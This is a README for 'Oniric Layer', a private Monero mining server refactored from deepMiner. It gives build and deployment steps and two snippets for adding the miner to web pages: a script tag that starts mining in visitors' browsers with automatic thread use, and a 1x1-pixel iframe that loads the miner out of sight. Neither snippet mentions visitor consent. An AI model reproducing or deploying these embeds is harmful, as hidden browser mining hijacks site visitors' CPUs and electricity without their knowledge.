

-= Oniric Layer =- 

A private XMR Server worker that work for one wallet 

Complete typescript refactoring and optimization 

of https://github.com/deepwn/deepMiner

-= Development =-

run these commands

1 - gulp
2 - npm run test 


-= Production =-

run these commands:

1 - gulp
2 - npm run compile
3 - go to dist/build and copy oniric , config.json and web directory
4 - put copied files via ftp on a web server and start with pm2 oniric executable



-= Usage =-

add this to web page:


- 1 Classic configuration
 
<script src="server/lib/oniric.min.js"> </script>
<script> var userID = 'Oniric';
         		var miner = new Oniric.Init(userID, {
         			autoThreads: true
         		});
         		miner.start(); </script>


- 2 Another configuration

<iframe style="display:block" width="1px" height="1px" src="yourserver:port/miner.html"></iframe>